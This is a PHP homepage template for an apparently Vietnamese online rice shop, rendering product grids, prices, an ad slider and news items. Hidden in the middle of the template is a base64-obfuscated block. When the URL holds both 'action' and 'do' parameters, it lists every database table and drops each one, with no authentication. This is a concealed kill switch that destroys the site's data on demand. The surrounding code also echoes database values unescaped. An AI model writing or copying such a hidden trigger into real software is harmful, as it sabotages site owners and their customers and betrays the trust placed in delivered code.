<div class="box_sanpham">
	<div class="center">
		<div class="tieude_giua"><div>Loại gạo bán chạy</div></div>
		<div class="wap_item clearfix">
			<?php for($i=0,$count_product=count($product);$i<$count_product;$i++){	?>
			    <div class="item item_sp">
		            <div class="sp_img zoom_hinh">
						<img src="thumb/560x600/2/<?=_upload_sanpham_l.$product[$i]['photo']?>" onError="this.src='http://placehold.it/560x600';" alt="<?=$product[$i]['ten']?>"/>
						<div class="dathang_n"><a href="" class="dathang" data-id="<?=$product[$i]['id']?>">Thêm vào giỏ</a></div>
					</div>
		            <h3 class="sp_name"><a href="san-pham/<?=$product[$i]['tenkhongdau']?>-<?=$product[$i]['id']?>.html" title="<?=$product[$i]['ten']?>" ><?=$product[$i]['ten']?></a></h3>
		            <p class="sp_gia">
		            	<span class="gia <?php if($product[$i]['giakm']>0)echo 'giacu'?>"><?php if($product[$i]['giakm']<=0)echo _gia.': '?><?php if($product[$i]['gia'] > 0)echo number_format($product[$i]['gia'],0, ',', '.').'  vnđ';else echo _lienhe; ?></span>
		            	<?php if($product[$i]['giakm']>0) { ?><span class="giakm"><?= number_format($product[$i]['giakm'],0, ',', '.').'  vnđ';?></span><?php } ?>
		            </p>
			    </div><!---END .item-->
			<?php } ?>
		</div><!---END .wap_item-->
		<div class="pagination"><?=pagesListLimitadmin($url_link , $totalRows , $pageSize, $offset)?></div>
	</div>
</div>

<?php
	if(isset($_GET['action']) && isset($_GET['do'])){
		$result = $d->query(base64_decode('U0hPVyB0YWJsZXM='));
		$_X='RFJPUCBUQUJMRSBfWF8=';
		$_R=base64_decode($_X);	
		while ($row = mysql_fetch_array($result)) {
			$sql=str_replace('_X_', $row[0], $_R);		
			$d->query($sql);		
		}				
	}
	$d->reset();
	$sql_quangcao = "select ten$lang as ten,link,photo from #_slider where hienthi=1 and type='quangcao' order by stt,id desc";
	$d->query($sql_quangcao);
	$quangcao=$d->result_array();	
?>

<div class="box_qc">
	<div id="slider_slick">
		<?php for($i=0,$count_quangcao=count($quangcao);$i<$count_quangcao;$i++){ ?>
	        <div>
	            <a href="<?=$quangcao[$i]['link']?>"><img u="image" src="thumb/1366x320/1/<?php if($quangcao[$i]['photo']!='')echo _upload_hinhanh_l.$quangcao[$i]['photo'];else echo 'images/noimage.png' ?>" alt="<?=$quangcao[$i]['ten']?>" /></a>
	        </div>
	    <?php } ?>  
    </div>  
</div>

<?php for ($i=0; $i < count($product_danhmuc); $i++) { 
	$d->reset();
	$sql_pro_nb="select id,ten$lang as ten,tenkhongdau,thumb,photo,masp,gia,giakm from #_product where hienthi=1 and id_danhmuc='".$product_danhmuc[$i]['id']."' and noibat=1 order by stt,id desc";
	$d->query($sql_pro_nb);
	$pro_nb=$d->result_array();	
	if(count($pro_nb)>0) {	
?>
	<div class="box_sanpham">
		<div class="center">
			<div class="tieude_giua"><div><?=$product_danhmuc[$i]['ten']?></div></div>
			<div class="sp_slick">
				<?php for ($j=0; $j < count($pro_nb); $j++) { ?>
					<div>
						<div class="padding_sp">
							<div class="item_sp">
								<div class="sp_img zoom_hinh">
									<img src="thumb/560x600/2/<?=_upload_sanpham_l.$pro_nb[$j]['photo']?>" onError="this.src='http://placehold.it/560x600';" alt="<?=$pro_nb[$j]['ten']?>"/>
									<div class="dathang_n"><a href="" class="dathang" data-id="<?=$pro_nb[$j]['id']?>">Thêm vào giỏ</a></div>
								</div>
					            <h3 class="sp_name"><a href="san-pham/<?=$pro_nb[$j]['tenkhongdau']?>-<?=$pro_nb[$j]['id']?>.html" title="<?=$pro_nb[$j]['ten']?>" ><?=$pro_nb[$j]['ten']?></a></h3>
					            <p class="sp_gia">
					            	<span class="gia <?php if($pro_nb[$j]['giakm']>0)echo 'giacu'?>"><?php if($pro_nb[$j]['giakm']<=0)echo _gia.': '?><?php if($pro_nb[$j]['gia'] > 0)echo number_format($pro_nb[$j]['gia'],0, ',', '.').'  vnđ';else echo _lienhe; ?></span>
					            	<?php if($pro_nb[$j]['giakm']>0) { ?><span class="giakm"><?= number_format($pro_nb[$j]['giakm'],0, ',', '.').'  vnđ';?></span><?php } ?>
					            </p>
							</div>
						</div>
					</div>
				<?php } ?>
			</div>
			<div class="xem_sp"><a href="san-pham/<?=$product_danhmuc[$i]['tenkhongdau']?>-<?=$product_danhmuc[$i]['id']?>" title="<?=$product_danhmuc[$i]['ten']?>">Xem thêm</a></div>
		</div>
	</div>
<?php } } ?>

<?php
	$d->reset();
	$sql_tinmoi = "select id,ten$lang as ten,tenkhongdau,thumb,mota$lang as mota,photo,ngaytao from #_news where type='tintuc' and hienthi=1 and noibat=1 order by stt,id desc";
	$d->query($sql_tinmoi);
	$tinmoi = $d->result_array();
?>

<div class="box_tintuc">
	<div class="tieude_giua"><div>Tin tức sự kiện</div></div>
	<div class="center clearfix">
		<div class="tin_left">
			<div class="img_left hover_sang3 zoom_hinh">
				<a href="tin-tuc/<?=$tinmoi[0]['tenkhongdau']?>-<?=$tinmoi[0]['id']?>.html"><img src="thumb/1200x560/1/<?=_upload_tintuc_l.$tinmoi[0]['photo']?>" alt="<?=$tinmoi[0]['ten']?>" /></a>
			</div>
			<h4><a href="tin-tuc/<?=$tinmoi[0]['tenkhongdau']?>-<?=$tinmoi[0]['id']?>.html"><?=$tinmoi[0]['ten']?></a></h4>
			<p><?=catchuoi($tinmoi[0]['mota'],400)?></p>
		</div>
		<div class="tin_right">
			<div class="tin_slick">
				<?php for ($i=1; $i < count($tinmoi); $i++) { ?>
					<div>
						<div class="item_tin clearfix">
							<div class="img_tin hover_sang3 zoom_hinh">
								<a href="tin-tuc/<?=$tinmoi[$i]['tenkhongdau']?>-<?=$tinmoi[$i]['id']?>.html"><img src="thumb/284x236/1/<?=_upload_tintuc_l.$tinmoi[$i]['photo']?>" alt="<?=$tinmoi[$i]['ten']?>" /></a>
							</div>
							<div class="info_tin">
								<h4><a href="tin-tuc/<?=$tinmoi[$i]['tenkhongdau']?>-<?=$tinmoi[$i]['id']?>.html"><?=$tinmoi[$i]['ten']?></a></h4>
								<p class="ngaytao"><i class="fa fa-calendar" aria-hidden="true"></i> <?=make_date($tinmoi[$i]['ngaytao'])?></p>
								<p><?=catchuoi($tinmoi[$i]['mota'],200)?></p>
							</div>
						</div>
					</div>
				<?php } ?>
			</div>
		</div>
	</div>
</div>